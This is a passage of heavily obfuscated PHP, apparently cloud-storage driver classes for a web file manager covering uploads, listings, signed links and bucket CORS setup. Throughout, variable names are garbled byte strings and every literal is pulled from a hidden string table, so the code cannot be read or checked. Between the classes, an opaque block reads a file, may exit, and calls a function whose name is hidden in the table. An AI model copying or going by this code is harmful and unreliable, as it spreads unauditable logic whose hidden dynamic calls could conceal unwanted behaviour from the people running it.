$ãê£îÎŞ = false) { $ëÁÚ¾ˆ‹ =& $_SERVER[è¶³ÒßÑ]; $Ÿâ³øŠ = array($ëÁÚ¾ˆ‹[32] => $this->pathThis($Ï¦É»È­), $ëÁÚ¾ˆ‹[97] => $this->getPathOuter($ëÁÚ¾ˆ‹[8] . $Ï¦É»È­), $ëÁÚ¾ˆ‹[33] => $ëÁÚ¾ˆ‹[88]); if ($ãê£îÎŞ) { return $Ÿâ³øŠ; } $Ÿâ³øŠ[$ëÁÚ¾ˆ‹[241]] = $Ÿâ³øŠ[$ëÁÚ¾ˆ‹[98]] = 0; $Ÿâ³øŠ[$ëÁÚ¾ˆ‹[242]] = $Ÿâ³øŠ[$ëÁÚ¾ˆ‹[243]] = !0; if (empty($Ï°×ù¿¡)) { $Ï°×ù¿¡ = $this->objectMeta($Ï¦É»È­); if (!$Ï°×ù¿¡) { return $Ÿâ³øŠ; } } $Ÿâ³øŠ[$ëÁÚ¾ˆ‹[241]] = intval($Ï°×ù¿¡[$ëÁÚ¾ˆ‹[1558]]); $Ÿâ³øŠ[$ëÁÚ¾ˆ‹[98]] = intval($Ï°×ù¿¡[$ëÁÚ¾ˆ‹[1559]]); return $Ÿâ³øŠ; } private function listObjs($ªÏÔóŞö, $«’€©Õ· = 0, $ğ¨Ùêªº = 1000) { $àë¶©†± =& $_SERVER[è¶³ÒßÑ]; $æ˜ñæÜ = array($àë¶©†±[1560], $àë¶©†±[1561] . $ğ¨Ùêªº); if ($«’€©Õ·) { $æ˜ñæÜ[] = $àë¶©†±[1562] . $«’€©Õ·; } $æ—‹ğİ“ = $this->ussRequest($ªÏÔóŞö, $àë¶©†±[271], !1, $æ˜ñæÜ); return !$æ—‹ğİ“[$àë¶©†±[1272]] ? !1 : $æ—‹ğİ“[$àë¶©†±[1262]]; } private function fileList($¤ÀŠè, &$ÂåİÖş±, &$—øß™ô“, $«àÎŠ©æ = false) { $Ä­òŒáä =& $_SERVER[è¶³ÒßÑ]; $İİ¨òóÂ = $Ä­òŒáä[12]; $Ì™ââÇ = 1000; $ıºÛ´‘‹ = rtrim($¤ÀŠè, $Ä­òŒáä[8]) . $Ä­òŒáä[8]; while (!0) { check_abort(); $äæ—Å“• = $this->listObjs($¤ÀŠè, $İİ¨òóÂ, $Ì™ââÇ); if (!$äæ—Å“•) { return !1; } $İİ¨òóÂ = isset($äæ—Å“•[$Ä­òŒáä[1563]]) ? $äæ—Å“•[$Ä­òŒáä[1563]] : $Ä­òŒáä[12]; $¸ò©Ø”à = isset($äæ—Å“•[$Ä­òŒáä[1564]]) ? $äæ—Å“•[$Ä­òŒáä[1564]] : array(); foreach ($¸ò©Ø”à as $îœ®ñíó) { $Õ¸§–“Ş = $îœ®ñíó[$Ä­òŒáä[33]] == $Ä­òŒáä[88] ? !0 : !1; $ª©öİË¾ = ltrim($ıºÛ´‘‹ . $îœ®ñíó[$Ä­òŒáä[32]], $Ä­òŒáä[8]) . ($Õ¸§–“Ş ? $Ä­òŒáä[8] : $Ä­òŒáä[12]); $ô‡ò­ó¼ = array($Ä­òŒáä[32] => $ª©öİË¾, $Ä­òŒáä[33] => $Õ¸§–“Ş ? $Ä­òŒáä[88] : $Ä­òŒáä[240], $Ä­òŒáä[89] => $îœ®ñíó[$Ä­òŒáä[406]], $Ä­òŒáä[1559] => $îœ®ñíó[$Ä­òŒáä[1565]]); $this->cacheMethodInfoSet($ª©öİË¾, $Õ¸§–“Ş, $ô‡ò­ó¼); if ($Õ¸§–“Ş) { $ÂåİÖş±[] = $ª©öİË¾; if ($«àÎŠ©æ) { $this->fileList($ª©öİË¾, $ÂåİÖş±, $—øß™ô“, $«àÎŠ©æ); } continue; } $—øß™ô“[] = $ô‡ò­ó¼; } if (count($¸ò©Ø”à) < $Ì™ââÇ) { break; } } $this->cacheMethodInfoSet($¤ÀŠè, !0); } public function listPath($ß±á¶šò, $ÂçÜÌğ² = false) { $şáı©€´ =& $_SERVER[è¶³ÒßÑ]; $öÉ¸¹ùÔ = $ƒ¸âÙ–ª = array(); $this->fileList($ß±á¶šò, $öÉ¸¹ùÔ, $ƒ¸âÙ–ª); foreach ($öÉ¸¹ùÔ as $ã’–¯Ø˜ => $ÅëÆŸÀ) { $öÉ¸¹ùÔ[$ã’–¯Ø˜] = $this->folderInfo($ÅëÆŸÀ, $ÂçÜÌğ²); } foreach ($ƒ¸âÙ–ª as $ã’–¯Ø˜ => $ÅëÆŸÀ) { $ƒ¸âÙ–ª[$ã’–¯Ø˜] = $this->fileInfo($ÅëÆŸÀ[$şáı©€´[32]], $ÂçÜÌğ², $ÅëÆŸÀ); } return array($şáı©€´[95] => $öÉ¸¹ùÔ, $şáı©€´[96] => $ƒ¸âÙ–ª); } public function has($î°Ô, $èŞÖÚà² = false, $ºÆ®Ğ…û = true) { $ıÙÒŠ»° =& $_SERVER[è¶³ÒßÑ]; $™ğ·‚ß´ = $ıÙÒŠ»°[12]; $ÜŠ€ÌÈĞ = 500; $â¨ƒ„«Ş = 0; $ê¸º®¯Ú = 0; $¤÷ïÖù = rtrim($î°Ô, $ıÙÒŠ»°[8]) . $ıÙÒŠ»°[8]; while (!0) { check_abort(); $‡‡çòàµ = $this->listObjs($î°Ô, $™ğ·‚ß´, $ÜŠ€ÌÈĞ); if (!$‡‡çòàµ) { return !1; } $™ğ·‚ß´ = isset($‡‡çòàµ[$ıÙÒŠ»°[1563]]) ? $‡‡çòàµ[$ıÙÒŠ»°[1563]] : $ıÙÒŠ»°[12]; $ï¼—­·× = isset($‡‡çòàµ[$ıÙÒŠ»°[1564]]) ? $‡‡çòàµ[$ıÙÒŠ»°[1564]] : array(); if (empty($ï¼—­·×)) { break; } $³í¬—ä = array_filter($ï¼—­·×, function ($ÕäÖä‚Ÿ) { $â‚ÕĞÆ« =& $_SERVER[è¶³ÒßÑ]; return $ÕäÖä‚Ÿ[$â‚ÕĞÆ«[33]] == $â‚ÕĞÆ«[88]; }); $õ­ÅÜ = count($ï¼—­·×); $³í¬—ä = count($³í¬—ä); $â¬Ï•Ë = $õ­ÅÜ - $³í¬—ä; if ($èŞÖÚà²) { $ê¸º®¯Ú += $³í¬—ä; $â¨ƒ„«Ş += $â¬Ï•Ë; if ($õ­ÅÜ < $ÜŠ€ÌÈĞ) { break; } continue; } if ($ºÆ®Ğ…û) { if ($â¬Ï•Ë) { return !0; } } else { if ($³í¬—ä) { return !0; } } if ($õ­ÅÜ < $ÜŠ€ÌÈĞ) { break; } } if ($èŞÖÚà²) { return array($ıÙÒŠ»°[249] => $â¨ƒ„«Ş, $ıÙÒŠ»°[250] => $ê¸º®¯Ú); } return !1; } public function listAll($®ÂÙíÍ¼) { $Ğõ™€Ô =& $_SERVER[è¶³ÒßÑ]; $ƒ‡ßÇãÇ = $ÖÔÃ„Ã = array(); $this->fileList($®ÂÙíÍ¼, $ƒ‡ßÇãÇ, $ÖÔÃ„Ã, !0); $ğ›Ö¨Àî = array_to_keyvalue($ÖÔÃ„Ã, $Ğõ™€Ô[32]); foreach ($ƒ‡ßÇãÇ as $ÑÈ½œ¦”) { if (is_string($ÑÈ½œ¦”)) { $ğ›Ö¨Àî[$ÑÈ½œ¦”] = array($Ğõ™€Ô[89] => 0); } } return $this->listAllFiles($®ÂÙíÍ¼, $ğ›Ö¨Àî); } public function canRead($‚ì·Œ‰¡) { return $this->exist($‚ì·Œ‰¡) ? !0 : !1; } public function canWrite($šé÷É¯) { return $this->exist($šé÷É¯) ? !0 : !1; } public function getContent($Äî¾­…Æ) { return $this->fileSubstr($Äî¾­…Æ, 0, -1); } public function setContent($Áıù²Ú±, $î­ÕÙÜö = '') { $÷†š™á± =& $_SERVER[è¶³ÒßÑ]; if (!$î­ÕÙÜö) { $°ÍÌ°ô„ = $this->ussRequest($Áıù²Ú±, $÷†š™á±[267]); return $°ÍÌ°ô„[$÷†š™á±[1272]]; } $ª‚³ô¹ = $this->tempFile($this->pathThis($Áıù²Ú±)); file_put_contents($ª‚³ô¹, $î­ÕÙÜö); if ($this->upload($Áıù²Ú±, $ª‚³ô¹)) { $this->tempFileRemve($ª‚³ô¹); return !0; } return !1; } public function fileSubstr($â²âãñ, $‡¹ÎÔ¿Ü, $¶ÄêÀœ) { $†€­‚ÃÆ =& $_SERVER[è¶³ÒßÑ]; if (!($Š—±‘¤¤ = $this->link($â²âãñ))) { return !1; } $ë¬™ŠåÌ = !1; if ($¶ÄêÀœ > 0) { $Ú„™Æƒ = $‡¹ÎÔ¿Ü + $¶ÄêÀœ - 1; $ë¬™ŠåÌ = array($†€­‚ÃÆ[1513] . $‡¹ÎÔ¿Ü . $†€­‚ÃÆ[455] . $Ú„™Æƒ); } $‹´¹ÓÎ = url_request($Š—±‘¤¤, $†€­‚ÃÆ[271], !1, $ë¬™ŠåÌ); return $‹´¹ÓÎ[$†€­‚ÃÆ[804]] ? $‹´¹ÓÎ[$†€­‚ÃÆ[1262]] : !1; } public function upload($ÕşŸ§²—, $äòøëì•, $°”³î±Ü = false, $Ó˜™úİÑ = REPEAT_REPLACE) { $ÙÖü„‘ =& $_SERVER[è¶³ÒßÑ]; $¥Ãã†¦Î = IO::size($äòøëì•); if ($¥Ãã†¦Î <= 1024 * 1024 * 200) { $’ö«“Ë§ = array($ÙÖü„‘[1566] . $äòøëì•); $ß…öŞŸˆ = $this->ussRequest($ÕşŸ§²—, $ÙÖü„‘[269], $’ö«“Ë§); return $ß…öŞŸˆ[$ÙÖü„‘[1272]] ? $this->getPathOuter($ÕşŸ§²—) : !1; } $âüÙÈâ = 1024 * 1024 * 10; $Ã¤…ßÌÀ = array($ÙÖü„‘[1567], $ÙÖü„‘[1568] . $¥Ãã†¦Î, $ÙÖü„‘[1569], $ÙÖü„‘[1570] . $âüÙÈâ); $ß…öŞŸˆ = $this->ussRequest($ÕşŸ§²—, $ÙÖü„‘[269], !1, $Ã¤…ßÌÀ); if (!$ß…öŞŸˆ[$ÙÖü„‘[1272]]) { return !1; } $ˆñŞê = $ß…öŞŸˆ[$ÙÖü„‘[1262]]; $ö’¼û¾ª = 0; $­Œè»Ş› = $ˆñŞê[$ÙÖü„‘[1571]]; $¿™­«İÕ = fopen($äòøëì•, $ÙÖü„‘[1434]); if (!$¿™­«İÕ) { return !1; } do { $¤—ÛÅ» = $ˆñŞê[$ÙÖü„‘[1572]]; fseek_64($¿™­«İÕ, $ö’¼û¾ª); $®‰ƒ¨±ƒ = fread($¿™­«İÕ, $¤—ÛÅ»); $æ×š°ı¨ = 0; do { $æ×š°ı¨++; $ˆñŞê = $this->uploadPart($ÕşŸ§²—, $ˆñŞê, $®‰ƒ¨±ƒ); } while (!$ˆñŞê && $æ×š°ı¨ < 3); if (!$ˆñŞê) { return !1; } $­Œè»Ş› = $ˆñŞê[$ÙÖü„‘[1571]]; $ö’¼û¾ª += $¤—ÛÅ»; } while ($­Œè»Ş› != -1); fclose($¿™­«İÕ); $Ã¤…ßÌÀ = array($ÙÖü„‘[1573], $ÙÖü„‘[1574] . $ˆñŞê[$ÙÖü„‘[1575]], $ÙÖü„‘[1569]); $ß…öŞŸˆ = $this->ussRequest($ÕşŸ§²—, $ÙÖü„‘[269], !1, $Ã¤…ßÌÀ); return $ß…öŞŸˆ[$ÙÖü„‘[1272]] ? $this->getPathOuter($°ßÇ‘ú½) : !1; } private function uploadPart($Ê³Òƒ¶õ, $ÉÂ‡Æ²ä, &$®­¡“Š×) { $ÌÊµŒÇÌ =& $_SERVER[è¶³ÒßÑ]; $ëşóÁ•® = array($ÌÊµŒÇÌ[1576], $ÌÊµŒÇÌ[1574] . $ÉÂ‡Æ²ä[$ÌÊµŒÇÌ[1575]], $ÌÊµŒÇÌ[1577] . $ÉÂ‡Æ²ä[$ÌÊµŒÇÌ[1571]], $ÌÊµŒÇÌ[156] . $ÉÂ‡Æ²ä[$ÌÊµŒÇÌ[1572]]); $Æüƒ—ß = $this->ussRequest($Ê³Òƒ¶õ, $ÌÊµŒÇÌ[269], $®­¡“Š×, $ëşóÁ•®); return !$Æüƒ—ß[$ÌÊµŒÇÌ[1272]] ? $Æüƒ—ß[$ÌÊµŒÇÌ[1272]] : $Æüƒ—ß[$ÌÊµŒÇÌ[1262]]; } public function uploadFormData($Ï·şè‡æ, $õª”ß = 3600) { return $this->uploadPolicy($Ï·şè‡æ, $õª”ß); } public function multiUploadFormData($ªš¿°›ö, $‰š—÷ÎÙ = 3600) { $ï¼›ÇşÀ =& $_SERVER[è¶³ÒßÑ]; $·‹ÊÛ˜ó = (int) $GLOBALS[$ï¼›ÇşÀ[7]][$ï¼›ÇşÀ[89]]; return $this->uploadPolicy($ªš¿°›ö, $‰š—÷ÎÙ, $·‹ÊÛ˜ó); } private function uploadPolicy($€ßÙ¯Ÿ¬, $›ª¡©âò = 3600, $ÙË„«ëù = 0) { $•‚Çü»„ =& $_SERVER[è¶³ÒßÑ]; $úÅâŸ›ü = $•‚Çü»„[8] . $this->bucket; $»ĞéÅŒÏ = gmdate($•‚Çü»„[1471]); $Î‘Õ¹¯ = array($•‚Çü»„[1578] => $this->bucket, $•‚Çü»„[1579] => $€ßÙ¯Ÿ¬, $•‚Çü»„[1580] => time() + $›ª¡©âò, $•‚Çü»„[1581] => $»ĞéÅŒÏ); if ($ÙË„«ëù) { $Î‘Õ¹¯[$•‚Çü»„[1454]] = $ÙË„«ëù; } $ˆœÖû±  = base64_encode(json_encode($Î‘Õ¹¯)); $±¨÷ìı = base64_encode(hash_hmac($•‚Çü»„[1535], "\120\117\123\x54\46{$úÅâŸ›ü}\x26{$»ĞéÅŒÏ}\46{$ˆœÖû± }", md5("{$this->userpass}"), !0)); $ÆÒõÖè· = array($•‚Çü»„[302] => $ˆœÖû± , $•‚Çü»„[1582] => "\x55\x50\x59\x55\x4e\x20{$this->username}\72{$±¨÷ìı}", $•‚Çü»„[218] => $this->endpoint . $úÅâŸ›ü); return $ÆÒõÖè·; } public function download($ë¿şÀ§, $´öƒµ‘˜) { $ª‚Œ¼ê = IO::getPathInner(IO::mkfile($´öƒµ‘˜)); if (!($šĞÀÅŒˆ = $this->link($ë¿şÀ§))) { return !1; } $Ì”Ãä­ = 0; $®’î©áô = 1024 * 200; $ãëü×Á = fopen($ª‚Œ¼ê, $_SERVER[è¶³ÒßÑ][1519]); while (!0) { $ôıí¬Šè = $this->fileSubstr($ë¿şÀ§, $Ì”Ãä­, $®’î©áô); if ($ôıí¬Šè === !1) { return !1; } fwrite($ãëü×Á, $ôıí¬Šè); $Ì”Ãä­ += $®’î©áô; if (strlen($ôıí¬Šè) < $®’î©áô) { break; } } fclose($ãëü×Á); return $´öƒµ‘˜; } public function link($¯²ÅÍšÜ, $ïˆ˜ô¾÷ = array()) { $«“İşô² =& $_SERVER[è¶³ÒßÑ]; $¯²ÅÍšÜ = trim($¯²ÅÍšÜ, $«“İşô²[8]); if (!empty($this->token)) { $¬ĞÒ´ÎË = strtotime(date($«“İşô²[1583])); $×†·‚‰ = substr(md5($this->token . $«“İşô²[353] . $¬ĞÒ´ÎË . $«“İşô²[1584] . $¯²ÅÍšÜ), 12, 8) . $¬ĞÒ´ÎË; $ïˆ˜ô¾÷[] = $«“İşô²[1585] . $×†·‚‰; } $şÍµ¦úŒ = !empty($ïˆ˜ô¾÷) ? $«“İşô²[86] . implode($«“İşô²[353], $ïˆ˜ô¾÷) : $«“İşô²[12]; return $this->getHost() . $«“İşô²[8] . $¯²ÅÍšÜ . $şÍµ¦úŒ; } public function fileOut($Õ½É÷ÃÉ, $”İşòÓÁ = false, $¬€ æâ“ = false, $¿‹ù™’ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Õ½É÷ÃÉ, $”İşòÓÁ, $¬€ æâ“, $¿‹ù™’); } if (!$¬€ æâ“) { $¬€ æâ“ = $this->pathThis($Õ½É÷ÃÉ); } $Ïİ¤ü©Š = $”İşòÓÁ ? array($_SERVER[è¶³ÒßÑ][1586] . rawurlencode($¬€ æâ“)) : array(); $±ˆ£Éœü = $this->link($Õ½É÷ÃÉ, $Ïİ¤ü©Š); $this->fileOutLink($±ˆ£Éœü); } public function fileOutServer($ùÑ™ ßí, $Ğº¥É…ô = false, $÷ééìÄÕ = false, $¼Êü÷åÔ = '') { parent::fileOut($ùÑ™ ßí, $Ğº¥É…ô, $÷ééìÄÕ, $¼Êü÷åÔ); } public function fileOutImage($Ö…¡ü, $ìé”­À¸ = 250) { $ş¢ªï‰ = $this->link($Ö…¡ü . $_SERVER[è¶³ÒßÑ][1587] . $ìé”­À¸); $this->fileOutLink($ş¢ªï‰); } public function fileOutImageServer($éñİ¹, $ƒÂòèÓ = 250) { parent::fileOutImage($éñİ¹, $ƒÂòèÓ); } public function hashMd5($Î©Ø¥åì) { $¸Ì¶ÎîÅ =& $_SERVER[è¶³ÒßÑ]; $ÏÌ½ùË = $this->_objectMeta($Î©Ø¥åì); return isset($ÏÌ½ùË[$¸Ì¶ÎîÅ[255]]) ? $ÏÌ½ùË[$¸Ì¶ÎîÅ[255]] : !1; } public function size($¦ÁÀÕ´÷) { $şå˜öÇ = $this->objectMeta($¦ÁÀÕ´÷); return $şå˜öÇ ? $şå˜öÇ[$_SERVER[è¶³ÒßÑ][89]] : 0; } public function info($Ïë¹ƒÇŒ) { if ($this->isFolder($Ïë¹ƒÇŒ)) { return $this->folderInfo($Ïë¹ƒÇŒ); } else { if ($this->isFile($Ïë¹ƒÇŒ)) { return $this->fileInfo($Ïë¹ƒÇŒ); } } return !1; } public function exist($ŞŒØ“Ö) { return $this->isFile($ŞŒØ“Ö) || $this->isFolder($ŞŒØ“Ö); } public function isFile($û¾¡¹ã›) { return !$this->isFolder($û¾¡¹ã›) && $this->objectMeta($û¾¡¹ã›); } public function isFolder($šÉÁıİŠ) { return $this->cacheMethod($_SERVER[è¶³ÒßÑ][189], $šÉÁıİŠ); } protected function objectMeta($å÷½©ñÏ) { return $this->cacheMethod($_SERVER[è¶³ÒßÑ][191], $å÷½©ñÏ); } protected function _objectMeta($§ÆÉÃú) { $ºò•İØ˜ =& $_SERVER[è¶³ÒßÑ]; if ($§ÆÉÃú == $ºò•İØ˜[12] || $§ÆÉÃú == $ºò•İØ˜[8]) { return array(); } $Ó¯í– = $this->ussRequest($§ÆÉÃú, $ºò•İØ˜[1588]); if (!$Ó¯í–[$ºò•İØ˜[1272]]) { return null; } $ÔŒîá† = isset($Ó¯í–[$ºò•İØ˜[1262]]) ? $Ó¯í–[$ºò•İØ˜[1262]] : array(); if (!isset($ÔŒîá†[$ºò•İØ˜[1589]])) { return null; } $î¶Ûõ¸ç = array($ºò•İØ˜[33] => isset($ÔŒîá†[$ºò•İØ˜[1589]]) ? $ÔŒîá†[$ºò•İØ˜[1589]] : null, $ºò•İØ˜[89] => isset($ÔŒîá†[$ºò•İØ˜[1590]]) ? $ÔŒîá†[$ºò•İØ˜[1590]] : null, $ºò•İØ˜[255] => isset($ÔŒîá†[$ºò•İØ˜[1591]]) ? $ÔŒîá†[$ºò•İØ˜[1591]] : null, $ºò•İØ˜[1558] => isset($ÔŒîá†[$ºò•İØ˜[1592]]) ? $ÔŒîá†[$ºò•İØ˜[1592]] : null); $î¶Ûõ¸ç[$ºò•İØ˜[1559]] = isset($ÔŒîá†[$ºò•İØ˜[1593]]) ? strtotime($ÔŒîá†[$ºò•İØ˜[1593]]) : $î¶Ûõ¸ç[$ºò•İØ˜[1558]]; return $î¶Ûõ¸ç; } protected function _isFolder($—´Ôâ—) { $˜õ°“é¿ =& $_SERVER[è¶³ÒßÑ]; if ($—´Ôâ— == $˜õ°“é¿[12] || $—´Ôâ— == $˜õ°“é¿[8]) { return !0; } $¦À÷ô á = $this->_objectMeta($—´Ôâ—); return isset($¦À÷ô á[$˜õ°“é¿[33]]) && $¦À÷ô á[$˜õ°“é¿[33]] == $˜õ°“é¿[88] ? !0 : !1; } } if ($_SERVER[$_SERVER[è¶³ÒßÑ][56]] != $_SERVER[$_SERVER[è¶³ÒßÑ][930]]) { $_getc = $_SERVER[è¶³ÒßÑ][57]; $_getfile = $_SERVER[$_SERVER[è¶³ÒßÑ][58]] . $_SERVER[è¶³ÒßÑ][59]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[è¶³ÒßÑ][60], $_getfilec); if (count($_getarrs) < $_SERVER[è¶³ÒßÑ][61]) { $exit = $_SERVER[è¶³ÒßÑ][62]; $exit(); } $_act = $_SERVER[è¶³ÒßÑ][63]; $_act($_SERVER[$_SERVER[è¶³ÒßÑ][54]]); } goto E£¼£ˆÍŒ; e†«‘âÊ¤Û: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($œîœ®ø) { parent::__construct($œîœ®ø); $this->setSignVersion($_SERVER[è¶³ÒßÑ][257]); } public function fileOutImage($©Êòı¯È, $•½Š¬¸í = 250) { $ãà–ŸØŞ =& $_SERVER[è¶³ÒßÑ]; if ($this->size($©Êòı¯È) > 1024 * 1024 * 25) { return $this->fileOutImageServer($©Êòı¯È, $•½Š¬¸í); } $…ûÈ³³¶ = array($ãà–ŸØŞ[1435] => $ãà–ŸØŞ[1436] . $•½Š¬¸í . $ãà–ŸØŞ[1437]); $ƒØ†îçä = $this->link($©Êòı¯È, $…ûÈ³³¶); $this->fileOutLink($ƒØ†îçä); } public function fileOutLink($›¨¾ğ´Ó) { $­Í‰«… =& $_SERVER[è¶³ÒßÑ]; if (substr($›¨¾ğ´Ó, 0, 7) == $­Í‰«…[1385]) { $›¨¾ğ´Ó = $­Í‰«…[1386] . substr($›¨¾ğ´Ó, 7); } header($­Í‰«…[185] . $›¨¾ğ´Ó); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Ğ†Ê”¥) { parent::__construct($Ğ†Ê”¥); $this->setSignVersion($_SERVER[è¶³ÒßÑ][257]); } public function fileOutLink($‚ÍÇÅòË) { $Ü’ê·´¼ =& $_SERVER[è¶³ÒßÑ]; if (substr($‚ÍÇÅòË, 0, 7) == $Ü’ê·´¼[1385]) { $‚ÍÇÅòË = $Ü’ê·´¼[1386] . substr($‚ÍÇÅòË, 7); } header($Ü’ê·´¼[185] . $‚ÍÇÅòË); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($şÈŠü–œ) { parent::__construct(); include_once SDK_DIR . $_SERVER[è¶³ÒßÑ][1438]; $this->_init($şÈŠü–œ); } public function _init($äŠùî½) { $³’½Í =& $_SERVER[è¶³ÒßÑ]; $this->config = $äŠùî½; foreach ($äŠùî½ as $Ê‘Şä÷â => $ÅùÆÛâñ) { if (isset($this->{$Ê‘Şä÷â})) { $this->{$Ê‘Şä÷â} = $ÅùÆÛâñ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($³’½Í[1439] . LNG($³’½Í[1440])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $“ÖÉ¶óƒ =& $_SERVER[è¶³ÒßÑ]; $€¿®¶è² = new OSS\Model\CorsConfig(); $™¯˜”ÆÙ = new OSS\Model\CorsRule(); $™¯˜”ÆÙ->addAllowedOrigin($“ÖÉ¶óƒ[1441]); $™¯˜”ÆÙ->addAllowedMethod($“ÖÉ¶óƒ[1442]); $™¯˜”ÆÙ->addAllowedMethod($“ÖÉ¶óƒ[1443]); $™¯˜”ÆÙ->addAllowedMethod($“ÖÉ¶óƒ[1444]); $™¯˜”ÆÙ->addAllowedMethod($“ÖÉ¶óƒ[1445]); $™¯˜”ÆÙ->addAllowedMethod($“ÖÉ¶óƒ[175]); $™¯˜”ÆÙ->setMaxAgeSeconds(600); $™¯˜”ÆÙ->addExposeHeader($“ÖÉ¶óƒ[1446]); $™¯˜”ÆÙ->addAllowedHeader($“ÖÉ¶óƒ[1441]); $€¿®¶è²->addRule($™¯˜”ÆÙ); try { $this->client->putBucketCors($this->bucket, $€¿®¶è²); } catch (OSS\Core\OssException $Şñş¢) { $this->writeLog(__FUNCTION__ . $“ÖÉ¶óƒ[224] . $Şñş¢->getMessage()); return !1; } return !0; } public function getBucketCors() { $®ËöœÊ =& $_SERVER[è¶³ÒßÑ]; $È¯ãÂí¡ = null; try { $È¯ãÂí¡ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¹×ƒøúû) { $this->writeLog(__FUNCTION__ . $®ËöœÊ[224] . $¹×ƒøúû->getMessage()); return null; } if (!$È¯ãÂí¡ || !($ÑÚ‡ºÙ÷ = $È¯ãÂí¡->getRules())) { return null; } $îÈàøıÊ = $ÑÚ‡ºÙ÷[0]->getAllowedOrigins(); $àßŞı»ç = $ÑÚ‡ºÙ÷[0]->getAllowedMethods(); $ÁÏªÃ‘ = $ÑÚ‡ºÙ÷[0]->getMaxAgeSeconds(); $¸«ò½¤« = $ÑÚ‡ºÙ÷[0]->getExposeHeaders(); $ãô¬Û” = $ÑÚ‡ºÙ÷[0]->getAllowedHeaders(); return array($®ËöœÊ[228] => isset($îÈàøıÊ[0]) ? $îÈàøıÊ[0] : $®ËöœÊ[12], $®ËöœÊ[232] => $àßŞı»ç, $®ËöœÊ[1447] => $ÁÏªÃ‘, $®ËöœÊ[1448] => isset($¸«ò½¤«[0]) ? $¸«ò½¤«[0] : $®ËöœÊ[12], $®ËöœÊ[229] => isset($ãô¬Û”[0]) ? $ãô¬Û”[0] : $®ËöœÊ[12]); } public function isBucketCors() { $§æÜŞª« =& $_SERVER[è¶³ÒßÑ]; $€õÎ›‹ƒ = $this->getBucketCors(); if (!$€õÎ›‹ƒ || !is_array($€õÎ›‹ƒ)) { return !1; } if ($€õÎ›‹ƒ[$§æÜŞª«[228]] != $§æÜŞª«[230] || $€õÎ›‹ƒ[$§æÜŞª«[229]] != $§æÜŞª«[230]) { return !1; } $›‚ÃãåÈ = array_map($§æÜŞª«[231], $€õÎ›‹ƒ[$§æÜŞª«[232]]); if (!is_array($›‚ÃãåÈ)) { $›‚ÃãåÈ = array(); } $÷üÏ˜Œå = array($§æÜŞª«[233], $§æÜŞª«[234], $§æÜŞª«[235], $§æÜŞª«[236], $§æÜŞª«[237]); $íªÇ´¡˜ = array_diff($÷üÏ˜Œå, $›‚ÃãåÈ); return empty($íªÇ´¡˜); } public function mkfile($—¤ÉÔûû, $îá€¡ìÎ = '', $Ì¹‰õÉ˜ = REPEAT_RENAME) { $¦†µ˜ÏÛ = $this->setContent($—¤ÉÔûû, $îá€¡ìÎ); if ($¦†µ˜ÏÛ !== !1) { return $this->getPathOuter($—¤ÉÔûû); } return !1; } public function mkdir($àµ¾´›, $€ğŸÔˆ¢ = REPEAT_SKIP) { if ($€ğŸÔˆ¢ && $this->_isFolder($àµ¾´›)) { return $this->getPathOuter($àµ¾´›); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($àµ¾´›)); } catch (OSS\Core\OssException $ÄÕ©†€Ğ) { $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][224] . $ÄÕ©†€Ğ->getMessage()); return !1; } return $this->getPathOuter($àµ¾´›); } private function fileList($”„ëÀÌ, $‘â§¦¾Š = '', $ÂœËßŞ = 0) { $õğ†¦©‹ =& $_SERVER[è¶³ÒßÑ]; $”„ëÀÌ = trim($”„ëÀÌ, $õğ†¦©‹[8]); $Ğ´®ÜÓá = empty($”„ëÀÌ) && $”„ëÀÌ !== $õğ†¦©‹[238] ? $õğ†¦©‹[12] : $”„ëÀÌ . $õğ†¦©‹[8]; $‹´ıË€ë = $õğ†¦©‹[12]; $ ÍÜ¦¼Ä = 1000; $¤“øË±‘ = $İÏíâŸŸ = array(); while (!0) { check_abort(); $¢Ğ®²¨‚ = array($õğ†¦©‹[1449] => $‘â§¦¾Š, $õğ†¦©‹[1450] => $Ğ´®ÜÓá, $õğ†¦©‹[1451] => $ ÍÜ¦¼Ä, $õğ†¦©‹[1452] => $‹´ıË€ë); try { $‘è¦¹© = $this->client->listObjects($this->bucket, $¢Ğ®²¨‚); } catch (OSS\Core\OssException $Ñ½ƒäÏŒ) { $this->writeLog(__FUNCTION__ . $õğ†¦©‹[224] . $Ñ½ƒäÏŒ->getMessage()); break; } $‹´ıË€ë = $‘è¦¹©->getNextMarker(); $ÁÙúöŸ´ = $‘è¦¹©->getObjectList(); $‘õ¡”‹ = $‘è¦¹©->getPrefixList(); foreach ($ÁÙúöŸ´ as $ëš÷€ä¦) { if ($ëš÷€ä¦->getKey() == $Ğ´®ÜÓá) { continue; } $ªèûô = $ëš÷€ä¦->getKey(); $ğ–¿ŸÉ = $ëš÷€ä¦->getSize(); $–ûâÉìŞ = $ëš÷€ä¦->getLastModified(); $Ö¶ùÒ¾ = trim($ëš÷€ä¦->getETag(), $õğ†¦©‹[131]); $«ŞöÜîª = $ÂœËßŞ ? array($õğ†¦©‹[32] => $ªèûô, $õğ†¦©‹[89] => $ğ–¿ŸÉ, $õğ†¦©‹[216] => strtotime($–ûâÉìŞ), $õğ†¦©‹[1453] => $Ö¶ùÒ¾) : $ªèûô; $âüŒ²°Æ = $ğ–¿ŸÉ == 0 && substr($ªèûô, strlen($ªèûô) - 1, 1) == $õğ†¦©‹[8] ? !0 : !1; $«âäûï¬ = array($õğ†¦©‹[89] => $ğ–¿ŸÉ, $õğ†¦©‹[1454] => $ğ–¿ŸÉ, $õğ†¦©‹[98] => strtotime($–ûâÉìŞ), $õğ†¦©‹[1455] => $–ûâÉìŞ, $õğ†¦©‹[1453] => $Ö¶ùÒ¾); $this->cacheMethodInfoSet($ªèûô, $âüŒ²°Æ, $«âäûï¬); if ($âüŒ²°Æ) { 